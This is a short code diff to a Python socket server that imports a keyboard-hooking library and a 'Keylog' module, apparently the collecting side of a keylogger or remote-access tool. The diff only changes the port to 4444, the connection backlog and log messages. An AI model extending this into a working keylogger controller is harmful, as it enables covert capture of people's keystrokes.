@@ -16,7 +16,7 @@ import pynput.keyboard
 import Program
 import Keylog
 
-PORT = 64444
+PORT = 4444
 img_bytes = b'\x00\x01\x02...'
 
 FONT = ("Arial", 20, "bold")
@@ -32,7 +32,8 @@ class Server:
         print(self.host + " " + str(PORT))
         self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server.bind((self.host, PORT))
-        self.server.listen(1)
+        self.server.listen(10)
+        print("Server started listening on port " + str(PORT))
         self.clients = []
         self.ns = None
         self.nr = None
@@ -40,7 +41,7 @@ class Server:
 
     def start(self):
         try:
-            print("Waiting for Clients")
+            print("SERVER: Waiting for Clients")
             while True:
                 conn, addr = self.server.accept()
                 print("Connected by", addr)
